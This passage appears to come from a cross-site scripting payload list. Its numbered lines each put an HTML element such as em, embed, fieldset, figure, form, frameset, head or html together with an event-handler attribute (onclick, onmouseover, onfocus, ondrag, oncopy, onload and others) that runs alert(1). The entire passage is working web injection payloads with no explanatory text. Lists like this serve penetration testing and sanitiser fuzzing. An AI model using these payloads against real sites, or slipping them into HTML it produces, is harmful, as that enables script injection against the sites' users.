1814 | <em oncopy="alert(1)" contenteditable>test</em>
1815 | <em oncut="alert(1)" contenteditable>test</em>
1816 | <em ondblclick="alert(1)">test</em>
1817 | <em onfocusout=alert(1) tabindex=1 id=x></em><input autofocus>
1818 | <em onkeydown="alert(1)" contenteditable>test</em>
1819 | <em onkeypress="alert(1)" contenteditable>test</em>
1820 | <em onkeyup="alert(1)" contenteditable>test</em>
1821 | <em onmousedown="alert(1)">test</em>
1822 | <em onmouseenter="alert(1)">test</em>
1823 | <em onmouseleave="alert(1)">test</em>
1824 | <em onmousemove="alert(1)">test</em>
1825 | <em onmouseout="alert(1)">test</em>
1826 | <em onmouseover="alert(1)">test</em>
1827 | <em onmouseup="alert(1)">test</em>
1828 | <em onpaste="alert(1)" contenteditable>test</em>
1829 | <embed draggable="true" ondrag="alert(1)">test</embed>
1830 | <embed draggable="true" ondragend="alert(1)">test</embed>
1831 | <embed draggable="true" ondragenter="alert(1)">test</embed>
1832 | <embed draggable="true" ondragleave="alert(1)">test</embed>
1833 | <embed draggable="true" ondragstart="alert(1)">test</embed>
1834 | <embed id=x onfocus=alert(1) type=text/html>
1835 | <embed id=x onfocusin=alert(1) type=text/html>
1836 | <embed id=x tabindex=1 onactivate=alert(1)></embed>
1837 | <embed id=x tabindex=1 onbeforeactivate=alert(1)></embed>
1838 | <embed id=x tabindex=1 onbeforedeactivate=alert(1)></embed><input autofocus>
1839 | <embed id=x tabindex=1 ondeactivate=alert(1)></embed><input id=y autofocus>
1840 | <embed onbeforecopy="alert(1)" contenteditable>test</embed>
1841 | <embed onbeforecut="alert(1)" contenteditable>test</embed>
1842 | <embed onbeforepaste="alert(1)" contenteditable>test</embed>
1843 | <embed onblur=alert(1) tabindex=1 id=x></embed><input autofocus>
1844 | <embed onclick="alert(1)">test</embed>
1845 | <embed oncontextmenu="alert(1)">test</embed>
1846 | <embed oncopy="alert(1)" contenteditable>test</embed>
1847 | <embed oncut="alert(1)" contenteditable>test</embed>
1848 | <embed ondblclick="alert(1)">test</embed>
1849 | <embed onfocusout=alert(1) tabindex=1 id=x></embed><input autofocus>
1850 | <embed onkeydown="alert(1)" contenteditable>test</embed>
1851 | <embed onkeypress="alert(1)" contenteditable>test</embed>
1852 | <embed onkeyup="alert(1)" contenteditable>test</embed>
1853 | <embed onmousedown="alert(1)">test</embed>
1854 | <embed onmouseenter="alert(1)">test</embed>
1855 | <embed onmouseleave="alert(1)">test</embed>
1856 | <embed onmousemove="alert(1)">test</embed>
1857 | <embed onmouseout="alert(1)">test</embed>
1858 | <embed onmouseover="alert(1)">test</embed>
1859 | <embed onmouseup="alert(1)">test</embed>
1860 | <embed onpaste="alert(1)" contenteditable>test</embed>
1861 | <embed src=/ onload=alert(1)>
1862 | <embed src=1 onerror=alert(1) type=image/gif>
1863 | <fieldset draggable="true" ondrag="alert(1)">test</fieldset>
1864 | <fieldset draggable="true" ondragend="alert(1)">test</fieldset>
1865 | <fieldset draggable="true" ondragenter="alert(1)">test</fieldset>
1866 | <fieldset draggable="true" ondragleave="alert(1)">test</fieldset>
1867 | <fieldset draggable="true" ondragstart="alert(1)">test</fieldset>
1868 | <fieldset id=x tabindex=1 onactivate=alert(1)></fieldset>
1869 | <fieldset id=x tabindex=1 onbeforeactivate=alert(1)></fieldset>
1870 | <fieldset id=x tabindex=1 onbeforedeactivate=alert(1)></fieldset><input autofocus>
1871 | <fieldset id=x tabindex=1 ondeactivate=alert(1)></fieldset><input id=y autofocus>
1872 | <fieldset id=x tabindex=1 onfocus=alert(1)></fieldset>
1873 | <fieldset id=x tabindex=1 onfocusin=alert(1)></fieldset>
1874 | <fieldset onbeforecopy="alert(1)" contenteditable>test</fieldset>
1875 | <fieldset onbeforecut="alert(1)" contenteditable>test</fieldset>
1876 | <fieldset onbeforepaste="alert(1)" contenteditable>test</fieldset>
1877 | <fieldset onblur=alert(1) tabindex=1 id=x></fieldset><input autofocus>
1878 | <fieldset onclick="alert(1)">test</fieldset>
1879 | <fieldset oncontextmenu="alert(1)">test</fieldset>
1880 | <fieldset oncopy="alert(1)" contenteditable>test</fieldset>
1881 | <fieldset oncut="alert(1)" contenteditable>test</fieldset>
1882 | <fieldset ondblclick="alert(1)">test</fieldset>
1883 | <fieldset onfocusout=alert(1) tabindex=1 id=x></fieldset><input autofocus>
1884 | <fieldset onkeydown="alert(1)" contenteditable>test</fieldset>
1885 | <fieldset onkeypress="alert(1)" contenteditable>test</fieldset>
1886 | <fieldset onkeyup="alert(1)" contenteditable>test</fieldset>
1887 | <fieldset onmousedown="alert(1)">test</fieldset>
1888 | <fieldset onmouseenter="alert(1)">test</fieldset>
1889 | <fieldset onmouseleave="alert(1)">test</fieldset>
1890 | <fieldset onmousemove="alert(1)">test</fieldset>
1891 | <fieldset onmouseout="alert(1)">test</fieldset>
1892 | <fieldset onmouseover="alert(1)">test</fieldset>
1893 | <fieldset onmouseup="alert(1)">test</fieldset>
1894 | <fieldset onpaste="alert(1)" contenteditable>test</fieldset>
1895 | <figcaption draggable="true" ondrag="alert(1)">test</figcaption>
1896 | <figcaption draggable="true" ondragend="alert(1)">test</figcaption>
1897 | <figcaption draggable="true" ondragenter="alert(1)">test</figcaption>
1898 | <figcaption draggable="true" ondragleave="alert(1)">test</figcaption>
1899 | <figcaption draggable="true" ondragstart="alert(1)">test</figcaption>
1900 | <figcaption id=x tabindex=1 onactivate=alert(1)></figcaption>
1901 | <figcaption id=x tabindex=1 onbeforeactivate=alert(1)></figcaption>
1902 | <figcaption id=x tabindex=1 onbeforedeactivate=alert(1)></figcaption><input autofocus>
1903 | <figcaption id=x tabindex=1 ondeactivate=alert(1)></figcaption><input id=y autofocus>
1904 | <figcaption id=x tabindex=1 onfocus=alert(1)></figcaption>
1905 | <figcaption id=x tabindex=1 onfocusin=alert(1)></figcaption>
1906 | <figcaption onbeforecopy="alert(1)" contenteditable>test</figcaption>
1907 | <figcaption onbeforecut="alert(1)" contenteditable>test</figcaption>
1908 | <figcaption onbeforepaste="alert(1)" contenteditable>test</figcaption>
1909 | <figcaption onblur=alert(1) tabindex=1 id=x></figcaption><input autofocus>
1910 | <figcaption onclick="alert(1)">test</figcaption>
1911 | <figcaption oncontextmenu="alert(1)">test</figcaption>
1912 | <figcaption oncopy="alert(1)" contenteditable>test</figcaption>
1913 | <figcaption oncut="alert(1)" contenteditable>test</figcaption>
1914 | <figcaption ondblclick="alert(1)">test</figcaption>
1915 | <figcaption onfocusout=alert(1) tabindex=1 id=x></figcaption><input autofocus>
1916 | <figcaption onkeydown="alert(1)" contenteditable>test</figcaption>
1917 | <figcaption onkeypress="alert(1)" contenteditable>test</figcaption>
1918 | <figcaption onkeyup="alert(1)" contenteditable>test</figcaption>
1919 | <figcaption onmousedown="alert(1)">test</figcaption>
1920 | <figcaption onmouseenter="alert(1)">test</figcaption>
1921 | <figcaption onmouseleave="alert(1)">test</figcaption>
1922 | <figcaption onmousemove="alert(1)">test</figcaption>
1923 | <figcaption onmouseout="alert(1)">test</figcaption>
1924 | <figcaption onmouseover="alert(1)">test</figcaption>
1925 | <figcaption onmouseup="alert(1)">test</figcaption>
1926 | <figcaption onpaste="alert(1)" contenteditable>test</figcaption>
1927 | <figure draggable="true" ondrag="alert(1)">test</figure>
1928 | <figure draggable="true" ondragend="alert(1)">test</figure>
1929 | <figure draggable="true" ondragenter="alert(1)">test</figure>
1930 | <figure draggable="true" ondragleave="alert(1)">test</figure>
1931 | <figure draggable="true" ondragstart="alert(1)">test</figure>
1932 | <figure id=x tabindex=1 onactivate=alert(1)></figure>
1933 | <figure id=x tabindex=1 onbeforeactivate=alert(1)></figure>
1934 | <figure id=x tabindex=1 onbeforedeactivate=alert(1)></figure><input autofocus>
1935 | <figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>
1936 | <figure id=x tabindex=1 onfocus=alert(1)></figure>
1937 | <figure id=x tabindex=1 onfocusin=alert(1)></figure>
1938 | <figure onbeforecopy="alert(1)" contenteditable>test</figure>
1939 | <figure onbeforecut="alert(1)" contenteditable>test</figure>
1940 | <figure onbeforepaste="alert(1)" contenteditable>test</figure>
1941 | <figure onblur=alert(1) tabindex=1 id=x></figure><input autofocus>
1942 | <figure onclick="alert(1)">test</figure>
1943 | <figure oncontextmenu="alert(1)">test</figure>
1944 | <figure oncopy="alert(1)" contenteditable>test</figure>
1945 | <figure oncut="alert(1)" contenteditable>test</figure>
1946 | <figure ondblclick="alert(1)">test</figure>
1947 | <figure onfocusout=alert(1) tabindex=1 id=x></figure><input autofocus>
1948 | <figure onkeydown="alert(1)" contenteditable>test</figure>
1949 | <figure onkeypress="alert(1)" contenteditable>test</figure>
1950 | <figure onkeyup="alert(1)" contenteditable>test</figure>
1951 | <figure onmousedown="alert(1)">test</figure>
1952 | <figure onmouseenter="alert(1)">test</figure>
1953 | <figure onmouseleave="alert(1)">test</figure>
1954 | <figure onmousemove="alert(1)">test</figure>
1955 | <figure onmouseout="alert(1)">test</figure>
1956 | <figure onmouseover="alert(1)">test</figure>
1957 | <figure onmouseup="alert(1)">test</figure>
1958 | <figure onpaste="alert(1)" contenteditable>test</figure>
1959 | <font draggable="true" ondrag="alert(1)">test</font>
1960 | <font draggable="true" ondragend="alert(1)">test</font>
1961 | <font draggable="true" ondragenter="alert(1)">test</font>
1962 | <font draggable="true" ondragleave="alert(1)">test</font>
1963 | <font draggable="true" ondragstart="alert(1)">test</font>
1964 | <font id=x tabindex=1 onactivate=alert(1)></font>
1965 | <font id=x tabindex=1 onbeforeactivate=alert(1)></font>
1966 | <font id=x tabindex=1 onbeforedeactivate=alert(1)></font><input autofocus>
1967 | <font id=x tabindex=1 ondeactivate=alert(1)></font><input id=y autofocus>
1968 | <font id=x tabindex=1 onfocus=alert(1)></font>
1969 | <font id=x tabindex=1 onfocusin=alert(1)></font>
1970 | <font onbeforecopy="alert(1)" contenteditable>test</font>
1971 | <font onbeforecut="alert(1)" contenteditable>test</font>
1972 | <font onbeforepaste="alert(1)" contenteditable>test</font>
1973 | <font onblur=alert(1) tabindex=1 id=x></font><input autofocus>
1974 | <font onclick="alert(1)">test</font>
1975 | <font oncontextmenu="alert(1)">test</font>
1976 | <font oncopy="alert(1)" contenteditable>test</font>
1977 | <font oncut="alert(1)" contenteditable>test</font>
1978 | <font ondblclick="alert(1)">test</font>
1979 | <font onfocusout=alert(1) tabindex=1 id=x></font><input autofocus>
1980 | <font onkeydown="alert(1)" contenteditable>test</font>
1981 | <font onkeypress="alert(1)" contenteditable>test</font>
1982 | <font onkeyup="alert(1)" contenteditable>test</font>
1983 | <font onmousedown="alert(1)">test</font>
1984 | <font onmouseenter="alert(1)">test</font>
1985 | <font onmouseleave="alert(1)">test</font>
1986 | <font onmousemove="alert(1)">test</font>
1987 | <font onmouseout="alert(1)">test</font>
1988 | <font onmouseover="alert(1)">test</font>
1989 | <font onmouseup="alert(1)">test</font>
1990 | <font onpaste="alert(1)" contenteditable>test</font>
1991 | <footer draggable="true" ondrag="alert(1)">test</footer>
1992 | <footer draggable="true" ondragend="alert(1)">test</footer>
1993 | <footer draggable="true" ondragenter="alert(1)">test</footer>
1994 | <footer draggable="true" ondragleave="alert(1)">test</footer>
1995 | <footer draggable="true" ondragstart="alert(1)">test</footer>
1996 | <footer id=x tabindex=1 onactivate=alert(1)></footer>
1997 | <footer id=x tabindex=1 onbeforeactivate=alert(1)></footer>
1998 | <footer id=x tabindex=1 onbeforedeactivate=alert(1)></footer><input autofocus>
1999 | <footer id=x tabindex=1 ondeactivate=alert(1)></footer><input id=y autofocus>
2000 | <footer id=x tabindex=1 onfocus=alert(1)></footer>
2001 | <footer id=x tabindex=1 onfocusin=alert(1)></footer>
2002 | <footer onbeforecopy="alert(1)" contenteditable>test</footer>
2003 | <footer onbeforecut="alert(1)" contenteditable>test</footer>
2004 | <footer onbeforepaste="alert(1)" contenteditable>test</footer>
2005 | <footer onblur=alert(1) tabindex=1 id=x></footer><input autofocus>
2006 | <footer onclick="alert(1)">test</footer>
2007 | <footer oncontextmenu="alert(1)">test</footer>
2008 | <footer oncopy="alert(1)" contenteditable>test</footer>
2009 | <footer oncut="alert(1)" contenteditable>test</footer>
2010 | <footer ondblclick="alert(1)">test</footer>
2011 | <footer onfocusout=alert(1) tabindex=1 id=x></footer><input autofocus>
2012 | <footer onkeydown="alert(1)" contenteditable>test</footer>
2013 | <footer onkeypress="alert(1)" contenteditable>test</footer>
2014 | <footer onkeyup="alert(1)" contenteditable>test</footer>
2015 | <footer onmousedown="alert(1)">test</footer>
2016 | <footer onmouseenter="alert(1)">test</footer>
2017 | <footer onmouseleave="alert(1)">test</footer>
2018 | <footer onmousemove="alert(1)">test</footer>
2019 | <footer onmouseout="alert(1)">test</footer>
2020 | <footer onmouseover="alert(1)">test</footer>
2021 | <footer onmouseup="alert(1)">test</footer>
2022 | <footer onpaste="alert(1)" contenteditable>test</footer>
2023 | <form draggable="true" ondrag="alert(1)">test</form>
2024 | <form draggable="true" ondragend="alert(1)">test</form>
2025 | <form draggable="true" ondragenter="alert(1)">test</form>
2026 | <form draggable="true" ondragleave="alert(1)">test</form>
2027 | <form draggable="true" ondragstart="alert(1)">test</form>
2028 | <form id=x tabindex=1 onactivate=alert(1)></form>
2029 | <form id=x tabindex=1 onbeforeactivate=alert(1)></form>
2030 | <form id=x tabindex=1 onbeforedeactivate=alert(1)></form><input autofocus>
2031 | <form id=x tabindex=1 ondeactivate=alert(1)></form><input id=y autofocus>
2032 | <form id=x tabindex=1 onfocus=alert(1)></form>
2033 | <form id=x tabindex=1 onfocusin=alert(1)></form>
2034 | <form onbeforecopy="alert(1)" contenteditable>test</form>
2035 | <form onbeforecut="alert(1)" contenteditable>test</form>
2036 | <form onbeforepaste="alert(1)" contenteditable>test</form>
2037 | <form onblur=alert(1) tabindex=1 id=x></form><input autofocus>
2038 | <form onclick="alert(1)">test</form>
2039 | <form oncontextmenu="alert(1)">test</form>
2040 | <form oncopy="alert(1)" contenteditable>test</form>
2041 | <form oncut="alert(1)" contenteditable>test</form>
2042 | <form ondblclick="alert(1)">test</form>
2043 | <form onfocusout=alert(1) tabindex=1 id=x></form><input autofocus>
2044 | <form onkeydown="alert(1)" contenteditable>test</form>
2045 | <form onkeypress="alert(1)" contenteditable>test</form>
2046 | <form onkeyup="alert(1)" contenteditable>test</form>
2047 | <form onmousedown="alert(1)">test</form>
2048 | <form onmouseenter="alert(1)">test</form>
2049 | <form onmouseleave="alert(1)">test</form>
2050 | <form onmousemove="alert(1)">test</form>
2051 | <form onmouseout="alert(1)">test</form>
2052 | <form onmouseover="alert(1)">test</form>
2053 | <form onmouseup="alert(1)">test</form>
2054 | <form onpaste="alert(1)" contenteditable>test</form>
2055 | <form onreset=alert(1)><input type=reset>
2056 | <form onsubmit=alert(1)><input type=submit>
2057 | <form><input oninvalid=alert(1) required><input type=submit>
2058 | <form><input type=search onsearch=alert(1) value="Hit return" autofocus>
2059 | <form><textarea oninvalid=alert(1) required><input type=submit>
2060 | <frame draggable="true" ondrag="alert(1)">test</frame>
2061 | <frame draggable="true" ondragend="alert(1)">test</frame>
2062 | <frame draggable="true" ondragenter="alert(1)">test</frame>
2063 | <frame draggable="true" ondragleave="alert(1)">test</frame>
2064 | <frame draggable="true" ondragstart="alert(1)">test</frame>
2065 | <frame id=x tabindex=1 onactivate=alert(1)></frame>
2066 | <frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>
2067 | <frame id=x tabindex=1 onbeforedeactivate=alert(1)></frame><input autofocus>
2068 | <frame id=x tabindex=1 ondeactivate=alert(1)></frame><input id=y autofocus>
2069 | <frame onbeforecopy="alert(1)" contenteditable>test</frame>
2070 | <frame onbeforecut="alert(1)" contenteditable>test</frame>
2071 | <frame onbeforepaste="alert(1)" contenteditable>test</frame>
2072 | <frame onblur=alert(1) tabindex=1 id=x></frame><input autofocus>
2073 | <frame onclick="alert(1)">test</frame>
2074 | <frame oncontextmenu="alert(1)">test</frame>
2075 | <frame oncopy="alert(1)" contenteditable>test</frame>
2076 | <frame oncut="alert(1)" contenteditable>test</frame>
2077 | <frame ondblclick="alert(1)">test</frame>
2078 | <frame onfocusout=alert(1) tabindex=1 id=x></frame><input autofocus>
2079 | <frame onkeydown="alert(1)" contenteditable>test</frame>
2080 | <frame onkeypress="alert(1)" contenteditable>test</frame>
2081 | <frame onkeyup="alert(1)" contenteditable>test</frame>
2082 | <frame onmousedown="alert(1)">test</frame>
2083 | <frame onmouseenter="alert(1)">test</frame>
2084 | <frame onmouseleave="alert(1)">test</frame>
2085 | <frame onmousemove="alert(1)">test</frame>
2086 | <frame onmouseout="alert(1)">test</frame>
2087 | <frame onmouseover="alert(1)">test</frame>
2088 | <frame onmouseup="alert(1)">test</frame>
2089 | <frame onpaste="alert(1)" contenteditable>test</frame>
2090 | <frameset draggable="true" ondrag="alert(1)">test</frameset>
2091 | <frameset draggable="true" ondragend="alert(1)">test</frameset>
2092 | <frameset draggable="true" ondragenter="alert(1)">test</frameset>
2093 | <frameset draggable="true" ondragleave="alert(1)">test</frameset>
2094 | <frameset draggable="true" ondragstart="alert(1)">test</frameset>
2095 | <frameset id=x tabindex=1 onactivate=alert(1)></frameset>
2096 | <frameset id=x tabindex=1 onbeforeactivate=alert(1)></frameset>
2097 | <frameset id=x tabindex=1 onbeforedeactivate=alert(1)></frameset><input autofocus>
2098 | <frameset id=x tabindex=1 ondeactivate=alert(1)></frameset><input id=y autofocus>
2099 | <frameset id=x tabindex=1 onfocus=alert(1)></frameset>
2100 | <frameset id=x tabindex=1 onfocusin=alert(1)></frameset>
2101 | <frameset onbeforecopy="alert(1)" contenteditable>test</frameset>
2102 | <frameset onbeforecut="alert(1)" contenteditable>test</frameset>
2103 | <frameset onbeforepaste="alert(1)" contenteditable>test</frameset>
2104 | <frameset onblur=alert(1) tabindex=1 id=x></frameset><input autofocus>
2105 | <frameset onclick="alert(1)">test</frameset>
2106 | <frameset oncontextmenu="alert(1)">test</frameset>
2107 | <frameset oncopy="alert(1)" contenteditable>test</frameset>
2108 | <frameset oncut="alert(1)" contenteditable>test</frameset>
2109 | <frameset ondblclick="alert(1)">test</frameset>
2110 | <frameset onfocusout=alert(1) tabindex=1 id=x></frameset><input autofocus>
2111 | <frameset onkeydown="alert(1)" contenteditable>test</frameset>
2112 | <frameset onkeypress="alert(1)" contenteditable>test</frameset>
2113 | <frameset onkeyup="alert(1)" contenteditable>test</frameset>
2114 | <frameset onmousedown="alert(1)">test</frameset>
2115 | <frameset onmouseenter="alert(1)">test</frameset>
2116 | <frameset onmouseleave="alert(1)">test</frameset>
2117 | <frameset onmousemove="alert(1)">test</frameset>
2118 | <frameset onmouseout="alert(1)">test</frameset>
2119 | <frameset onmouseover="alert(1)">test</frameset>
2120 | <frameset onmouseup="alert(1)">test</frameset>
2121 | <frameset onpageshow=alert(1)>
2122 | <frameset onpaste="alert(1)" contenteditable>test</frameset>
2123 | <frameset><frame id=x onfocus=alert(1)>
2124 | <frameset><frame id=x onfocusin=alert(1)>
2125 | <frameset><frame onload=alert(1)>
2126 | <h1 draggable="true" ondrag="alert(1)">test</h1>
2127 | <h1 draggable="true" ondragend="alert(1)">test</h1>
2128 | <h1 draggable="true" ondragenter="alert(1)">test</h1>
2129 | <h1 draggable="true" ondragleave="alert(1)">test</h1>
2130 | <h1 draggable="true" ondragstart="alert(1)">test</h1>
2131 | <h1 id=x tabindex=1 onactivate=alert(1)></h1>
2132 | <h1 id=x tabindex=1 onbeforeactivate=alert(1)></h1>
2133 | <h1 id=x tabindex=1 onbeforedeactivate=alert(1)></h1><input autofocus>
2134 | <h1 id=x tabindex=1 ondeactivate=alert(1)></h1><input id=y autofocus>
2135 | <h1 id=x tabindex=1 onfocus=alert(1)></h1>
2136 | <h1 id=x tabindex=1 onfocusin=alert(1)></h1>
2137 | <h1 onbeforecopy="alert(1)" contenteditable>test</h1>
2138 | <h1 onbeforecut="alert(1)" contenteditable>test</h1>
2139 | <h1 onbeforepaste="alert(1)" contenteditable>test</h1>
2140 | <h1 onblur=alert(1) tabindex=1 id=x></h1><input autofocus>
2141 | <h1 onclick="alert(1)">test</h1>
2142 | <h1 oncontextmenu="alert(1)">test</h1>
2143 | <h1 oncopy="alert(1)" contenteditable>test</h1>
2144 | <h1 oncut="alert(1)" contenteditable>test</h1>
2145 | <h1 ondblclick="alert(1)">test</h1>
2146 | <h1 onfocusout=alert(1) tabindex=1 id=x></h1><input autofocus>
2147 | <h1 onkeydown="alert(1)" contenteditable>test</h1>
2148 | <h1 onkeypress="alert(1)" contenteditable>test</h1>
2149 | <h1 onkeyup="alert(1)" contenteditable>test</h1>
2150 | <h1 onmousedown="alert(1)">test</h1>
2151 | <h1 onmouseenter="alert(1)">test</h1>
2152 | <h1 onmouseleave="alert(1)">test</h1>
2153 | <h1 onmousemove="alert(1)">test</h1>
2154 | <h1 onmouseout="alert(1)">test</h1>
2155 | <h1 onmouseover="alert(1)">test</h1>
2156 | <h1 onmouseup="alert(1)">test</h1>
2157 | <h1 onpaste="alert(1)" contenteditable>test</h1>
2158 | <head draggable="true" ondrag="alert(1)">test</head>
2159 | <head draggable="true" ondragend="alert(1)">test</head>
2160 | <head draggable="true" ondragenter="alert(1)">test</head>
2161 | <head draggable="true" ondragleave="alert(1)">test</head>
2162 | <head draggable="true" ondragstart="alert(1)">test</head>
2163 | <head id=x tabindex=1 onactivate=alert(1)></head>
2164 | <head id=x tabindex=1 onbeforeactivate=alert(1)></head>
2165 | <head id=x tabindex=1 onbeforedeactivate=alert(1)></head><input autofocus>
2166 | <head id=x tabindex=1 ondeactivate=alert(1)></head><input id=y autofocus>
2167 | <head id=x tabindex=1 onfocus=alert(1)></head>
2168 | <head id=x tabindex=1 onfocusin=alert(1)></head>
2169 | <head onbeforecopy="alert(1)" contenteditable>test</head>
2170 | <head onbeforecut="alert(1)" contenteditable>test</head>
2171 | <head onbeforepaste="alert(1)" contenteditable>test</head>
2172 | <head onblur=alert(1) tabindex=1 id=x></head><input autofocus>
2173 | <head onclick="alert(1)">test</head>
2174 | <head oncontextmenu="alert(1)">test</head>
2175 | <head oncopy="alert(1)" contenteditable>test</head>
2176 | <head oncut="alert(1)" contenteditable>test</head>
2177 | <head ondblclick="alert(1)">test</head>
2178 | <head onfocusout=alert(1) tabindex=1 id=x></head><input autofocus>
2179 | <head onkeydown="alert(1)" contenteditable>test</head>
2180 | <head onkeypress="alert(1)" contenteditable>test</head>
2181 | <head onkeyup="alert(1)" contenteditable>test</head>
2182 | <head onmousedown="alert(1)">test</head>
2183 | <head onmouseenter="alert(1)">test</head>
2184 | <head onmouseleave="alert(1)">test</head>
2185 | <head onmousemove="alert(1)">test</head>
2186 | <head onmouseout="alert(1)">test</head>
2187 | <head onmouseover="alert(1)">test</head>
2188 | <head onmouseup="alert(1)">test</head>
2189 | <head onpaste="alert(1)" contenteditable>test</head>
2190 | <header draggable="true" ondrag="alert(1)">test</header>
2191 | <header draggable="true" ondragend="alert(1)">test</header>
2192 | <header draggable="true" ondragenter="alert(1)">test</header>
2193 | <header draggable="true" ondragleave="alert(1)">test</header>
2194 | <header draggable="true" ondragstart="alert(1)">test</header>
2195 | <header id=x tabindex=1 onactivate=alert(1)></header>
2196 | <header id=x tabindex=1 onbeforeactivate=alert(1)></header>
2197 | <header id=x tabindex=1 onbeforedeactivate=alert(1)></header><input autofocus>
2198 | <header id=x tabindex=1 ondeactivate=alert(1)></header><input id=y autofocus>
2199 | <header id=x tabindex=1 onfocus=alert(1)></header>
2200 | <header id=x tabindex=1 onfocusin=alert(1)></header>
2201 | <header onbeforecopy="alert(1)" contenteditable>test</header>
2202 | <header onbeforecut="alert(1)" contenteditable>test</header>
2203 | <header onbeforepaste="alert(1)" contenteditable>test</header>
2204 | <header onblur=alert(1) tabindex=1 id=x></header><input autofocus>
2205 | <header onclick="alert(1)">test</header>
2206 | <header oncontextmenu="alert(1)">test</header>
2207 | <header oncopy="alert(1)" contenteditable>test</header>
2208 | <header oncut="alert(1)" contenteditable>test</header>
2209 | <header ondblclick="alert(1)">test</header>
2210 | <header onfocusout=alert(1) tabindex=1 id=x></header><input autofocus>
2211 | <header onkeydown="alert(1)" contenteditable>test</header>
2212 | <header onkeypress="alert(1)" contenteditable>test</header>
2213 | <header onkeyup="alert(1)" contenteditable>test</header>
2214 | <header onmousedown="alert(1)">test</header>
2215 | <header onmouseenter="alert(1)">test</header>
2216 | <header onmouseleave="alert(1)">test</header>
2217 | <header onmousemove="alert(1)">test</header>
2218 | <header onmouseout="alert(1)">test</header>
2219 | <header onmouseover="alert(1)">test</header>
2220 | <header onmouseup="alert(1)">test</header>
2221 | <header onpaste="alert(1)" contenteditable>test</header>
2222 | <hgroup draggable="true" ondrag="alert(1)">test</hgroup>
2223 | <hgroup draggable="true" ondragend="alert(1)">test</hgroup>
2224 | <hgroup draggable="true" ondragenter="alert(1)">test</hgroup>
2225 | <hgroup draggable="true" ondragleave="alert(1)">test</hgroup>
2226 | <hgroup draggable="true" ondragstart="alert(1)">test</hgroup>
2227 | <hgroup id=x tabindex=1 onactivate=alert(1)></hgroup>
2228 | <hgroup id=x tabindex=1 onbeforeactivate=alert(1)></hgroup>
2229 | <hgroup id=x tabindex=1 onbeforedeactivate=alert(1)></hgroup><input autofocus>
2230 | <hgroup id=x tabindex=1 ondeactivate=alert(1)></hgroup><input id=y autofocus>
2231 | <hgroup id=x tabindex=1 onfocus=alert(1)></hgroup>
2232 | <hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>
2233 | <hgroup onbeforecopy="alert(1)" contenteditable>test</hgroup>
2234 | <hgroup onbeforecut="alert(1)" contenteditable>test</hgroup>
2235 | <hgroup onbeforepaste="alert(1)" contenteditable>test</hgroup>
2236 | <hgroup onblur=alert(1) tabindex=1 id=x></hgroup><input autofocus>
2237 | <hgroup onclick="alert(1)">test</hgroup>
2238 | <hgroup oncontextmenu="alert(1)">test</hgroup>
2239 | <hgroup oncopy="alert(1)" contenteditable>test</hgroup>
2240 | <hgroup oncut="alert(1)" contenteditable>test</hgroup>
2241 | <hgroup ondblclick="alert(1)">test</hgroup>
2242 | <hgroup onfocusout=alert(1) tabindex=1 id=x></hgroup><input autofocus>
2243 | <hgroup onkeydown="alert(1)" contenteditable>test</hgroup>
2244 | <hgroup onkeypress="alert(1)" contenteditable>test</hgroup>
2245 | <hgroup onkeyup="alert(1)" contenteditable>test</hgroup>
2246 | <hgroup onmousedown="alert(1)">test</hgroup>
2247 | <hgroup onmouseenter="alert(1)">test</hgroup>
2248 | <hgroup onmouseleave="alert(1)">test</hgroup>
2249 | <hgroup onmousemove="alert(1)">test</hgroup>
2250 | <hgroup onmouseout="alert(1)">test</hgroup>
2251 | <hgroup onmouseover="alert(1)">test</hgroup>
2252 | <hgroup onmouseup="alert(1)">test</hgroup>
2253 | <hgroup onpaste="alert(1)" contenteditable>test</hgroup>
2254 | <hr draggable="true" ondrag="alert(1)">test</hr>
2255 | <hr draggable="true" ondragend="alert(1)">test</hr>
2256 | <hr draggable="true" ondragenter="alert(1)">test</hr>
2257 | <hr draggable="true" ondragleave="alert(1)">test</hr>
2258 | <hr draggable="true" ondragstart="alert(1)">test</hr>
2259 | <hr id=x tabindex=1 onactivate=alert(1)></hr>
2260 | <hr id=x tabindex=1 onbeforeactivate=alert(1)></hr>
2261 | <hr id=x tabindex=1 onbeforedeactivate=alert(1)></hr><input autofocus>
2262 | <hr id=x tabindex=1 ondeactivate=alert(1)></hr><input id=y autofocus>
2263 | <hr id=x tabindex=1 onfocus=alert(1)></hr>
2264 | <hr id=x tabindex=1 onfocusin=alert(1)></hr>
2265 | <hr onbeforecopy="alert(1)" contenteditable>test</hr>
2266 | <hr onbeforecut="alert(1)" contenteditable>test</hr>
2267 | <hr onbeforepaste="alert(1)" contenteditable>test</hr>
2268 | <hr onblur=alert(1) tabindex=1 id=x></hr><input autofocus>
2269 | <hr onclick="alert(1)">test</hr>
2270 | <hr oncontextmenu="alert(1)">test</hr>
2271 | <hr oncopy="alert(1)" contenteditable>test</hr>
2272 | <hr oncut="alert(1)" contenteditable>test</hr>
2273 | <hr ondblclick="alert(1)">test</hr>
2274 | <hr onfocusout=alert(1) tabindex=1 id=x></hr><input autofocus>
2275 | <hr onkeydown="alert(1)" contenteditable>test</hr>
2276 | <hr onkeypress="alert(1)" contenteditable>test</hr>
2277 | <hr onkeyup="alert(1)" contenteditable>test</hr>
2278 | <hr onmousedown="alert(1)">test</hr>
2279 | <hr onmouseenter="alert(1)">test</hr>
2280 | <hr onmouseleave="alert(1)">test</hr>
2281 | <hr onmousemove="alert(1)">test</hr>
2282 | <hr onmouseout="alert(1)">test</hr>
2283 | <hr onmouseover="alert(1)">test</hr>
2284 | <hr onmouseup="alert(1)">test</hr>
2285 | <hr onpaste="alert(1)" contenteditable>test</hr>
2286 | <html draggable="true" ondrag="alert(1)">test</html>
2287 | <html draggable="true" ondragend="alert(1)">test</html>
2288 | <html draggable="true" ondragenter="alert(1)">test</html>
2289 | <html draggable="true" ondragleave="alert(1)">test</html>
2290 | <html draggable="true" ondragstart="alert(1)">test</html>
2291 | <html id=x tabindex=1 onactivate=alert(1)></html>
2292 | <html id=x tabindex=1 onbeforeactivate=alert(1)></html>
2293 | <html id=x tabindex=1 onbeforedeactivate=alert(1)></html><input autofocus>
2294 | <html id=x tabindex=1 ondeactivate=alert(1)></html><input id=y autofocus>
2295 | <html id=x tabindex=1 onfocus=alert(1)></html>
2296 | <html id=x tabindex=1 onfocusin=alert(1)></html>
2297 | <html onbeforecopy="alert(1)" contenteditable>test</html>
2298 | <html onbeforecut="alert(1)" contenteditable>test</html>
2299 | <html onbeforepaste="alert(1)" contenteditable>test</html>
